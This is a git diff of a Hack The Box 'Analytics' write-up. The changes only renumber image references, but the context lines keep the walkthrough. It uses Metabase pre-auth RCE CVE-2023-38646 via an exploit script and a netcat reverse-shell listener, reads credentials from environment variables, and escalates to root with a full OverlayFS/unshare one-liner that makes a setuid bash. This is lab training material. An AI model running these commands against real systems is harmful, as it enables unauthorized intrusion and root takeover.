@@ -2,7 +2,7 @@
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (284).png" alt="" width="120"><figcaption><p>hackthebox.com - © HACKTHEBOX</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (298).png" alt="" width="120"><figcaption><p>hackthebox.com - © HACKTHEBOX</p></figcaption></figure>
 
 </div>
 
@@ -89,21 +89,21 @@ Seeing http-title there's a new subdomain: http://analytical.htb/ and browsing o
 
 We can confirm it using a web proxy such as Burp Suite:
 
-<figure><img src="../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>
 
 To resolve this, we add the domain to our /etc/hosts file
 
-<figure><img src="../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>
 
 The task is to retrieve a new subdomain configured to provide a different application on the target web server, we found it discovering source code of web page:
 
-<figure><img src="../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>
 
 This URL refers to login page, and to resolve it we need to add it to /etc/hosts
 
-<figure><img src="../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 data.analytical.htb
@@ -118,7 +118,7 @@ whatweb http://data.analytical.htb/
 http://data.analytical.htb/ [200 OK] Cookies[metabase.DEVICE], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[metabase.DEVICE], IP[10.129.229.224], Script[application/json], Strict-Transport-Security[max-age=31536000], Title[Metabase], UncommonHeaders[x-permitted-cross-domain-policies,x-content-type-options,content-security-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.18.0]
 ```
 
-<figure><img src="../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 Metabase
@@ -128,7 +128,7 @@ Metabase
 
 Using WhatWeb and an nmap scan, we were able to discover the Metabase version. However, it is simpler to retrieve this information by viewing the source code of the web page.
 
-<figure><img src="../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 v0.46.6
@@ -160,7 +160,7 @@ We discover it reading documentation of the team that discovered this vulnerabil
 
 {% embed url="https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646" %}
 
-<figure><img src="../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 /api/setup/validate
@@ -187,7 +187,7 @@ All right, then we make me in listening mode on port 1339 on attacker machine us
 nc -nvlp 1339
 ```
 
-<figure><img src="../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>
 
 we save exploit locally and run following command
 
@@ -197,7 +197,7 @@ python3 exploit.py -t "249fa03d-fd94-4d5b-b94f-b4ebf3df681f" -u "http://data.ana
 
 and we're in
 
-<figure><img src="../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 metabase
@@ -209,7 +209,7 @@ This questions take us an important hint to understand what we can do.
 
 Infact, using command export, that show us environment variable we found credentials
 
-<figure><img src="../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 META\_PASS
@@ -223,9 +223,9 @@ Upon checking with `sudo -l`, we found that we do not have permissions. However,
 
 `ssh metalytics@analytics.htb`
 
-<figure><img src="../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -241,7 +241,7 @@ We use `uname -a` command to display kernel version
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -254,7 +254,7 @@ We use `uname -a` command to display kernel version
 We can use `lsb_release -a` or `cat /etc/os-release`\
 
 
-<figure><img src="../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 UBUNTU 22.04.03 LTS (JAMMY)
@@ -284,7 +284,7 @@ Then, executing bash script, we have become root and can now access the root fla
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
 ```
 
-<figure><img src="../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -294,4 +294,4 @@ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/pyt
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
